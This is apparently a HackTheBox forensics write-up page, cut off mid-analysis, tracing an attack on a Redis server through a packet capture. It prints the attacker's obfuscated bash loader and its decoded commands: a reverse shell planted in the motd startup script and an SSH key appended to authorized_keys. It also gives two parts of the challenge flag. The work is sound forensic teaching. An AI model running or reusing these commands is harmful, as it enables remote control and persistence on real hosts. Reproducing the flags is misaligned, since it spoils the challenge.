@@ -1,0 +1,596 @@
+<!DOCTYPE html>
+<html id="doc" class="">
+<div id="particles-js">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+
+        <!--  Essential META Tags -->
+        <meta property="og:title" content="ReadTrails HackTheBox Writeup">
+        <meta name="description" content="ReadTrails HackTheBox Writeup | 0xv01d">
+        <meta property="og:type" content="article" />
+        <meta property="og:image" content="/images/HTB/challenges/forensics/favicon.ico">
+        <meta property="og:url" content="https://0xv01d.github.io/hackthebox/challenges/redtrails">
+        <meta name="twitter:card" content="/images/HTB/challenges/forensics/favicon.ico">
+        <meta property="og:locale" content="en_US">
+
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+        <script src="/Scripts/js/particles.js"></script>
+        <script src="/Scripts/js/app.js"></script>
+        <title>ReadTrails HackTheBox Writeup | 0xv01d</title>
+        <script type="application/ld+json"></script>
+
+        <link rel="stylesheet" href="/Styles/style.css?v=">
+    	<link rel="stylesheet" href="/Styles/highlight_monokai.css">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.1/css/all.css" crossorigin="anonymous">
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"/>
+        <!-- Bootstrap CSS -->
+        <!--<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css"/>-->
+    	<link rel="stylesheet" href="/Styles/style_darkwing.css">
+    	<link rel="stylesheet" href="/Styles/footer.css">
+        <script src="/Scripts/js/bar.js"></script>
+
+
+        <!-- Setup Google Analytics -->
+    	<link rel="shortcut icon" type="image/x-icon" href="/images/HTB/challenges/forensics/favicon.ico">
+
+        <!--Information Sidebar-->
+
+    </head>
+    <body>
+
+        <aside id="menu" class="hide">
+            <div class="inner flex-row-vertical">
+                <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+                    <i class="icon icon-lg icon-times-circle"></i>
+                    <!--        <i class="icon icon-lg icon-close"></i>-->
+                </a>
+                <div class="brand-wrap avatar-wrapper">
+                    <!--    <div class="brand-wrap avatar-wrapper" style="background-image:url(/images/index/avatar.png);"> -->
+                    <a href="https:0xv01d.github.io">
+                        <img class="avatar shake" src="/images/index/avatar.png">
+
+                    </a>
+                    <p></p>
+                    <h1 class="tubelight"><strong>0xv01d</strong></h1>
+                </div>
+
+                <div class="scroll-wrap flex-col">
+                    <ul class="nav">
+
+                        <li class="waves-block waves-effect menu-item">
+                            <a href="/">
+                                <i class="icon icon-lg icon-home"></i>
+                                Home
+                            </a>
+                        </li>
+<!--
+                        <li class="waves-block waves-effect menu-item">
+                            <a href="#">
+                                <i class="icon icon-lg icon-archives"></i>
+                                Archives
+                            </a>
+                        </li>
+
+                        <li class="waves-block waves-effect menu-item">
+                            <a href="#">
+                                <i class="icon icon-lg icon-tags"></i>
+                                Tags
+                            </a>
+                        </li>
+-->
+                        <li class="waves-block waves-effect menu-item">
+                            <a href="https://github.com/0xv01d" target="_blank">
+                                <i class="icon icon-lg icon-github"></i>
+                                Github
+                            </a>
+                        </li>
+
+                        <li class="waves-block waves-effect menu-item">
+                            <a href="https://infosec-0xv01d.medium.com/" target="_blank">
+                                <i class="icon_new fa-brands fa-medium"></i>
+                                <!--                <i class="icon icon-lg icon-medium"></i>-->
+                                Medium
+                            </a>
+                        </li>
+
+                        <li class="waves-block waves-effect menu-item">
+                            <a href="https://www.youtube.com/@0xv01d_infosec" target="_blank">
+                                <i class="icon_new fa-brands fa-youtube"></i>
+                                Youtube
+                            </a>
+                        </li>
+                        
+                        <li class="waves-block waves-effect menu-item">
+                            <a href="#" target="_blank">
+                                <i class="icon_new fa-brands fa-twitch"></i>
+                                Twitch
+                            </a>
+                        </li>
+
+                        <li class="waves-block waves-effect menu-item">
+                            <a href="https://www.linkedin.com/in/isaac-david-g-7bb187318?utm_source=share&utm_campaign=share_via&utm_content=profile&utm_medium=android_app" target="_blank">
+                                <i class="icon_new fa-brands fa-linkedin"></i>
+                                Linkedin
+                            </a>
+                        </li>
+
+                        <li class="waves-block waves-effect menu-item">
+                            <a href="/about">
+                                <i class="icon icon-lg icon-link"></i>
+                                About
+                            </a>
+                        </li>
+                    </ul>
+                    <a style="padding-left: 0.7rem; padding-top: 3rem;"
+                        href="https://app.hackthebox.com/profile/1120840" rel="noreferrer noopener" target="_blank">
+                        <img src="http://www.hackthebox.eu/badge/image/1120840" alt="Hack The Box">
+                    </a>
+                </div>
+            </div>
+        </aside>
+
+        <main id="main">
+    <!--        class="app-container"> -->
+    <div class="fixed-top" id="message"></div>
+        <header class="top-header" id="header">
+        <div class="flex-row">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle" style="padding-right: 0.4rem;">
+            <i class="icon icon-lg icon-navicon"></i>
+            </a>
+            <div class="flex-col header-title ellipsis" style="visibility: visible;">RedTrails - HackTheBox</div>
+            
+            <div class="search-wrap" id="search-wrap">
+                <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                    <i class="icon icon-lg icon-chevron-left"></i>
+                </a>
+                <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+                <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                    <i class="fa-solid fa-language"></i>
+    <!--                <i class="icon icon-lg icon-language"></i>-->
+                </a>
+            </div>
+            
+            
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+                <i class="icon icon-lg icon-share-alt"></i>
+            </a>
+            
+        </div>
+
+        </header>
+        
+    <div class="container body-wrap">
+
+            <article class="post">		
+                <header class="post-header">
+
+        
+    <!--Machine Title-->
+                <div class="title">RedTrails Walkthrough</div>			
+    <!--Skill Tags-->								
+                <div class="tag-skills">
+                    <svg class="icon icon-tag svg-tag" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+                        <title>tag</title>
+                        <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" x2="7.01" y1="7" y2="7"></line>
+                    </svg>
+                    <a class="tag" href="#">Forensics</a>
+                    <a class="tag" href="#">Wireshark</a>
+                    <a class="tag" href="#">Redis</a>
+                    <a class="tag" href="#">Bash-Deobfuscation</a>
+                    <a class="tag" href="#">ELF</a>
+                    <a class="tag" href="#">Shared-Object</a>
+                    <a class="tag" href="#">Reversing</a>
+                    <a class="tag" href="#">Cutter</a>
+                    <a class="tag" href="#">AES-256-CBC</a>
+                    <a class="tag" href="#">OPENSSL</a>
+                </div>
+
+                </header>
+
+                <div class="subtitle" style="font-size: 2em;">Challenge Description</div>
+                <div class="description-box">
+                  <div class="description-box-icon">
+                    <img src="/images/HTB/challenges/forensics/ic-forensics.svg" alt="SVG Image" width="24" height="24">
+                  </div>
+                  <div class="description-box-text">Our SOC team detected a suspicious activity on one of our redis instance. Despite the fact it was password protected it seems that the attacker still obtained access to it. We need to put in place a remediation strategy as soon as possible, to do that it's necessary to gather more informations about the attack used. NOTE: flag is composed by three parts.
+                  </div>
+                </div> 
+
+                <!--Machine Resolution-->
+
+                <h1 id="Initial-Setup" class="toc-add toc-title">Initial Setup</h1>
+                <p class="head-img">Once we extract the zip provided we get a network capture in pcap format, let's fire up wireshark to analyze the traffic.</p>
+            <div class="language-plaintext highlighter-rouge"><div class="highlight">
+                <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div><pre class="highlight"><code>
+<span class="na">❯</span><span class="ld"><span class="kt"> unzip </span>RedTrails.zip
+Archive:  RedTrails.zip
+[RedTrails.zip] capture.pcap password: 
+  inflating: capture.pcap
+
+<span class="na">❯</span><span class="kt"> file </span>./capture.pcap
+./capture.pcap: pcap capture file, microsecond ts (little-endian) - version 2.4 (Ethernet, capture length 262144)
+    </span>	</code></pre></div></div>
+
+                <h1 id="Wireshark-Analysis" class="toc-add" style="padding-top: 2.5rem;">Wireshark Analysis</h1>
+                <h2 id="Analyzing-Network-Communications" class="toc-add">Analyzing Network Communications</h2>
+                <p class="head-img">After analyse the capture we can see that almost the whole communication was through Redis but one HTTP stream, that stream seems the be the server querying a file from another server, presumably the attacker's server.</p>
+                <img class="img-post" style="max-width: 1333px;" src="/images/HTB/challenges/forensics/redtrails/wireshark_analysis.png"/>
+
+                <p class="head-img">So this is the conversation statistics so far.</p>
+                <img class="img-post" style="max-width: 1040px;" src="/images/HTB/challenges/forensics/redtrails/pcap_conversation_statistics.png"/>
+
+                <h2 id="Exporting-HTTP-Objects" class="toc-add">Exporting HTTP Objects</h2>
+                <p class="head-img">Fine, let's export the file transmited [File -> Export Objects -> HTTP]</p>
+                <img class="img-post" style="max-width: 685px;" src="/images/HTB/challenges/forensics/redtrails/export_http_objects.png"/>
+
+                <h1 id="Decoding-Obfuscated-Script" class="toc-add" style="padding-top: 2.5rem;">Decoding Obfuscated Script</h1>
+                <h2 id="Initial-Script-Analysis" class="toc-add">Initial Script Analysis</h2>
+                <p class="head-img">As expected the file is obfuscated, but we can focus on the eval function, the only variable defined and actually being executed is 's', it was defined with a long base64 string that seems to be backwards.</p>
+            <div class="language-plaintext highlighter-rouge"><div class="highlight">
+                <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div><pre class="highlight"><code>
+<span class="na">❯</span><span class="ld"><span class="kt"> bat </span>-p -l bash ./VgLy8V0Zxo
+
+gH4<span class="gd">=</span><span class="k">"Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" '==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
+' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp=""</span>
+x<span class="gd">=</span>$(<span class="kt">eval</span> "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")
+<span class="kt">eval</span> "$N0q$x$Hc2$rQW"
+    </span>	</code></pre></div></div>
+
+                <h2 id="Extract-and-Analyze-Payloads" class="toc-add">Extract and Analyze Payloads</h2>
+                <p class="head-img">After decode the string we get another bash script with two functions each one define variables with base64 strings to finally get concatenated and executed, we can just trim the part when it's piped to bash to get the decoded commands.</p>
+            <div class="language-plaintext highlighter-rouge"><div class="highlight">
+                <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div><pre class="highlight"><code>
+<span class="na">❯</span><span class="ld"><span class="kt"> echo </span><span class="k">'==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'</span> | <span class="kt">rev</span> | <span class="kt">base64</span> -d
+
+#!/bin/bash
+
+<span class="na">lhJVXukWibAFfkv</span>() {
+	ABvnz<span class="gd">=</span><span class="k">'ZWNobyAnYmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3R'</span>
+	QOPjH<span class="gd">=</span><span class="k">'jcC8xMC4xMC4wLjIwMC8xMzM3IDA+JjEiJyA+IC9'</span>
+	gQIxX<span class="gd">=</span><span class="k">'ldGMvdXBkYXRlLW1vdGQuZC8wMC1oZWFkZXIK'</span>
+    <span class="kt">echo</span> "$ABvnz$QOPjH$gQIxX" <span class="gd">|</span> base64 <span class="ng">--decode</span> <span class="gd">|</span> bash
+}
+
+<span class="na">x7KG0bvubT6dID2()</span> {
+	LQebW<span class="gd">=</span><span class="k">"ZWNobyAtZSAiXG5zc2gtcnNhIEFBQUFCM056YUMxeWMyRUFBQUFEQVFBQkFBQUNBUUM4VmtxOVVUS01ha0F4MlpxK1BuWk5jNm5ZdUVL"</span>
+	gVR7i<span class="gd">=</span><span class="k">"M1pWWHhIMTViYlVlQitlbENiM0piVkp5QmZ2QXVaMHNvbmZBcVpzeXE5Smc2L0tHdE5zRW10VktYcm9QWGh6RnVtVGdnN1oxTnZyVU52"</span>
+	bkzHk<span class="gd">=</span><span class="k">"bnFMSWNmeFRuUDErLzRYMjg0aHAwYkYyVmJJVGI2b1FLZ3pSZE9zOEd0T2FzS2FLMGsvLzJFNW8wUktJRWRyeDBhTDVIQk9HUHgwcDhH"</span>
+	q97up<span class="gd">=</span><span class="k">"ckdlNGtSS29Bb2tHWHdEVlQyMkxsQnlsUmtBNit4NmpadGQyZ1loQ01nU1owaU05UnlZN2s3SzEzdEhYekVrN09jaVVtZDUvWjdZdW9s"</span>
+	GYJan<span class="gd">=</span><span class="k">"bnQzQnlYOWErSWZMTUQvRlFOeTFCNERZaHNZNjJPN28yeFIwdnhrQkVwNVVoQkFYOGdPVEcwd2p6clVIeG1kVWltWGdpeTM5WVZaYVRK"</span>
+	HJj6A<span class="gd">=</span><span class="k">"UXdMQnR6SlMvL1loa2V3eUYvK0NQMEg3d0lLSUVybGY1V0ZLNXNrTFlPNnVLVnB4NmFrR1hZOEdBRG5QVTNpUEsvTXRCQytScVdzc2Rr"</span>
+	fD9Kc<span class="gd">=</span><span class="k">"R3FGSUE1eEcyRm4rS2xpZDlPYm0xdVhleEpmWVZqSk1PZnZ1cXRiNktjZ0xtaTV1UmtBNit4NmpadGQyZ1loQ01nU1owaU05UnlZN2s3"</span>
+	hpAgs<span class="gd">=</span><span class="k">"SzEzdEhYekVrN09jaVVtZDUvWjdZdW9sbnQzQnlYOWErSWxTeGFpT0FEMmlOSmJvTnVVSXhNSC85SE5ZS2Q2bWx3VXBvdnFGY0dCcVhp"</span>
+	FqOPN<span class="gd">=</span><span class="k">"emNGMjFieE5Hb09FMzFWZm94MmZxMnFXMzBCRFd0SHJyWWk3NmlMaDAyRmVySEVZSGRRQUFBMDhOZlVIeUN3MGZWbC9xdDZiQWdLU2Iw"</span>
+	CpJLT<span class="gd">=</span><span class="k">"Mms2OTFsY0RBbzVKcEVFek5RcHViMFg4eEpJdHJidz09SFRCe3IzZDE1XzFuNTc0bmMzNSIgPj4gfi8uc3NoL2F1dGhvcml6ZWRfa2V5"</span>
+	PIx1p<span class="gd">=</span><span class="k">"cw=="</span>
+	<span class="kt">echo</span> <span class="k">"$LQebW$gVR7i$bkzHk$q97up$GYJan$HJj6A$fD9Kc$hpAgs$FqOPN$CpJLT$PIx1p"</span> <span class="gd">|</span> base64 <span class="ng">--decode</span> <span class="gd">|</span> bash
+}
+
+<span class="na">hL8FbEfp9L1261G</span>() {
+	lhJVXukWibAFfkv
+	x7KG0bvubT6dID2
+}
+
+hL8FbEfp9L1261G
+</span>	</code></pre></div></div>
+
+                <h2 id="Identifying-Attack-Techniques" class="toc-add">Identifying Attack Techniques</h2>
+        <p class="head-img">After executing the script we get the commands used by the thread actor, he send a reverse shell and add his ssh public key to gain some persistence, in the final part of the public key we get the first part of the flag.</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight">
+    <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div><pre class="highlight"><code>
+<span class="na">❯</span><span class="ld"><span class="kt"> ./decode.sh </span> | <span class="kt"> cat </span>-p -l sh
+
+<span class="kt">echo</span> <span class="k">'bash -c "bash -i >& /dev/tcp/10.10.0.200/1337 0>&1"'</span> <span class="gd">></span> /etc/update-motd.d/00-header
+<span class="kt">echo</span> <span class="ng">-e</span> <span class="k">"\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC8Vkq9UTKMakAx2Zq+PnZNc6nYuEK3ZVXxH15bbUeB+elCb3JbVJyBfvAuZ0sonfAqZsyq9Jg6/KGtNsEmtVKXroPXhzFumTgg7Z1NvrUNvnqLIcfxTnP1+/4X284hp0bF2VbITb6oQKgzRdOs8GtOasKaK0k//2E5o0RKIEdrx0aL5HBOGPx0p8GrGe4kRKoAokGXwDVT22LlBylRkA6+x6jZtd2gYhCMgSZ0iM9RyY7k7K13tHXzEk7OciUmd5/Z7Yuolnt3ByX9a+IfLMD/FQNy1B4DYhsY62O7o2xR0vxkBEp5UhBAX8gOTG0wjzrUHxmdUimXgiy39YVZaTJQwLBtzJS//YhkewyF/+CP0H7wIKIErlf5WFK5skLYO6uKVpx6akGXY8GADnPU3iPK/MtBC+RqWssdkGqFIA5xG2Fn+Klid9Obm1uXexJfYVjJMOfvuqtb6KcgLmi5uRkA6+x6jZtd2gYhCMgSZ0iM9RyY7k7K13tHXzEk7OciUmd5/Z7Yuolnt3ByX9a+IlSxaiOAD2iNJboNuUIxMH/9HNYKd6mlwUpovqFcGBqXizcF21bxNGoOE31Vfox2fq2qW30BDWtHrrYi76iLh02FerHEYHdQAAA08NfUHyCw0fVl/qt6bAgKSb02k691lcDAo5JpEEzNQpub0X8xJItrbw==<span class="gd">HTB{r3d15_1n574nc35</span>"</span> <span class="gd">>></span> ~/.ssh/authorized_keys
+</span>	</code></pre></div></div>
+
+<blockquote>
+    <p>
+        HTB{r3d15_1n574nc35
+    </p>
+</blockquote>
+
+                <h1 id="Wireshark-Analysis-2" class="toc-add" style="padding-top: 2.5rem;">Wireshark Analysis 2</h1>
+                <h2 id="Analyzing-Network-Communications" class="toc-add">Analyzing Network Streams</h2>
+    <p class="head-img">Continuing to analyze the tcp streams we can obtain the following part of the flag in stream 0</p>
+    <img class="img-post" style="max-width: 906px;" src="/images/HTB/challenges/forensics/redtrails/tcpstream_analysis_1.png"/>
+
+<blockquote>
+    <p>
+        _c0uld_0p3n_n3w
+    </p>
+</blockquote>
+
+    <h3 id="Identifying-and-Extracting-Loaded-Module" class="toc-add" style="margin-top: 2rem;">Identifying and Extracting Loaded Module</h3>
+    <p class="head-img">Continuing to analyze the next stream we can see that the module x10SPFHN.so is being loaded.</p>
+    <img class="img-post" style="max-width: 1353px;" src="/images/HTB/challenges/forensics/redtrails/tcpstream_analysis_2.png"/>
+
+    <p class="head-img">As the communication it's going through Redis the module can't be exported as usual, but we can track it to the tcp stream 6 packet 110</p>
+    <img class="img-post" style="max-width: 1348px;" src="/images/HTB/challenges/forensics/redtrails/track_shared_object.png"/>
+
+    <p class="head-img">We can copy it as hex stream and save it to a file trimming the first 8 bytes that correspond to the lenght of the data, ensuring that the first bytes are the ELF magick bytes [0x7F, 0x45, 0x4C, 0x46, 0x02, 0x01, 0x01]</p>
+    <img class="img-post" style="max-width: 658px;" src="/images/HTB/challenges/forensics/redtrails/save_shared_object.png"/>
+
+                <h1 id="Recreating-ELF-Binary" class="toc-add" style="padding-top: 2.5rem;">Recreating ELF Binary</h1>
+            <p class="head-img">Now we can recreate the binary.</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight">
+    <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div><pre class="highlight"><code>
+<span class="na">❯</span><span class="ld"><span class="kt"> xxd </span>-r -p ./hex-stream.txt ./x10SPFHN.so
+
+<span class="na">❯</span> <span class="kt">file</span> ./x10SPFHN.so
+
+./x10SPFHN.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, stripped
+</span>	</code></pre></div></div>
+
+                <h1 id="Analyzing-The-Loaded-Module" class="toc-add" style="padding-top: 2.5rem;">Analyzing The Loaded Module</h1>
+            <p class="head-img">Analyzing the ELF we found functions like EVP_aes_256_cbc that are part of libssl, which makes me think that it's main purpose is encrypting data, let's fire up the decompiler.</p>
+        <div class="language-plaintext highlighter-rouge"><div class="highlight">
+    <div class="clip_container"><button class="copy-btn" onclick="copyToClipboard(this)"><i class="fa-solid fa-clipboard"></i></button></div><pre class="highlight"><code>
+<span class="na">❯</span><span class="ld"><span class="kt"> dissector </span> -a ./x10SPFHN.so
+
+<................................................................................................................................>
+<span class="gd">SYMBOL TABLE:</span>
+Found symbol table [<span class="k">.dynsym</span>] with <span class="k">376</span> entries:
+[ NR ] st_value           st_size     TYPE        BINDING    VISIBILITY     st_shndx    st_name
+[   0] 0x0000000000000000 0x00000  STT_NOTYPE    STB_LOCAL   STV_DEFAULT    SHN_UNDEF   
+[   1] 0x0000000000000000 0x00000  STT_FUNC      STB_GLOBAL  STV_DEFAULT    SHN_UNDEF   strncpy
+[   2] 0x0000000000000000 0x00000  STT_NOTYPE    STB_GLOBAL  STV_DEFAULT    SHN_UNDEF   EVP_aes_256_cbc
+[   3] 0x0000000000000000 0x00000  STT_FUNC      STB_GLOBAL  STV_DEFAULT    SHN_UNDEF   strlen
+[   4] 0x0000000000000000 0x00000  STT_FUNC      STB_GLOBAL  STV_DEFAULT    SHN_UNDEF   __stack_chk_fail
+[   5] 0x0000000000000000 0x00000  STT_FUNC      STB_GLOBAL  STV_DEFAULT    SHN_UNDEF   pclose
+[   6] 0x0000000000000000 0x00000  STT_FUNC      STB_GLOBAL  STV_DEFAULT    SHN_UNDEF   snprintf
+[   7] 0x0000000000000000 0x00000  STT_FUNC      STB_GLOBAL  STV_DEFAULT    SHN_UNDEF   fgets
+[   8] 0x0000000000000000 0x00000  STT_NOTYPE    STB_GLOBAL  STV_DEFAULT    SHN_UNDEF   EVP_CIPHER_CTX_free
+[   9] 0x0000000000000000 0x00000  STT_NOTYPE    STB_GLOBAL  STV_DEFAULT    SHN_UNDEF   EVP_EncryptUpdate
+[  10] 0x0000000000000000 0x00000  STT_FUNC      STB_GLOBAL  STV_DEFAULT    SHN_UNDEF   malloc
+[  11] 0x0000000000000000 0x00000  STT_FUNC      STB_GLOBAL  STV_DEFAULT    SHN_UNDEF   __isoc99_sscanf
